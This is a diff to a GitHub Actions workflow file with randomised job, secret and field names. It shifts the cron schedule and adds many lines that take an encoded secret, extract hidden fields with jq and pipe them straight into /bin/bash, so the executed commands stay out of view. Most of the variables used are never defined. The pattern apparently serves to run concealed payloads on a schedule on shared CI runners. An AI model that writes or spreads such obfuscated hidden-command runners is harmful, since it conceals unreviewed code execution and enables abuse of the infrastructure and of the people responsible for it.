@@ -3,8 +3,7 @@ name: taohuixuan2518
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 5/6 * * *'
-
+    - cron: '28 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,10 +12,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: taohuixuan2518
         env:
-          tbrds15: ${{ secrets.tbrds15 }}
+          mzzd2832: ${{ secrets.mzzd2832 }}
         run: |
-          echo $tbrds15 | jq -r .s97 | /bin/bash
-          echo $f43 | jq -r .e827 | /bin/bash
-          echo $ni2859 | jq -r .xh4595 | /bin/bash
-          echo $qgmde07327 | jq -r .rsh703 | /bin/bash
+          echo $mzzd2832 | jq -r .e7 | /bin/bash
+          echo $r1 | jq -r .vecn4053 | /bin/bash
+          echo $z192 | jq -r .sjxa015 | /bin/bash
+          echo $sngw3727 | jq -r .ax82664 | /bin/bash
+          echo $ex49 | jq -r .vgwdv45764 | /bin/bash
+          echo $iy78 | jq -r .lb67709 | /bin/bash
+          echo $l78297 | jq -r .f8116 | /bin/bash
+          echo $xkrut49896 | jq -r .b11259 | /bin/bash
+          echo $hfs1486 | jq -r .oig7458 | /bin/bash
+          echo $vsw6 | jq -r .c48347 | /bin/bash
+          echo $nxean89487 | jq -r .jpkpf400 | /bin/bash
+          echo $izzv5 | jq -r .ilqs61 | /bin/bash
+          echo $eh56636 | jq -r .wmn1990 | /bin/bash
+          echo $ffrwj3736 | jq -r .a4 | /bin/bash
+          echo $gv0 | jq -r .qunr605 | /bin/bash
+          echo $zbn9311 | jq -r .wdb01482 | /bin/bash
 
